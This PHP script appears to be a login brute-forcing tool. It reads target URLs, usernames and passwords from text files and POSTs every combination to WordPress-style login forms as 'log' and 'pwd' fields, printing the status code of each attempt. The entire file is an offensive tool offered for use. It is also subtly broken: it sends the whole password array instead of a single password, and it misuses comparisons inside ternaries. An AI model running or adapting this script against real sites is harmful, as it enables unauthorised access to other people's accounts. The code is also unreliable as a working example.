<?php
    require "vendor/autoload.php";
    require "lib/functions.php";

    $client = new GuzzleHttp\Client();

    $verifieds   = fopen("verified.txt", 'r+') or die("File verified.txt not exists!");
    $logins      = file('logins.txt') or die("File logins.txt not exists!");
    $passwords   = file('passwords.txt') or die("File passwords.txt not exists!");

    $logins = array_map('trimRow', $logins);
    $passwords = array_map('trimRow', $passwords);

    foreach ($logins as $login) {
        foreach ($passwords as $password) {
            $verified = fgets($verifieds);
            $url      = explode(';', $verified)[0];

//            if (($login == "{login}" || $password == "{login}") && isset(explode(";", $verified)[1])) {
            if (isset(explode(";", $verified)[1])) {
                $username  = explode(';', $verified)[1];
                $login     == '{login}' ? : $username = $login;
                $passwords == '{login}' ? : $username = $passwords;
            } elseif (!isset(explode(";", $verified)[1]) && ($login == "{login}" || $password == "{login}")) {
                continue;
            }



            $response = $client->request('POST', $url, [
                'form_params' => [
                    'log' => $login,
                    'pwd' => $passwords
                ]
            ]);

            echo "login: {$login} | password: {$password} url: {$url} | status code: " . $response->getStatusCode() . PHP_EOL;
        }
    }
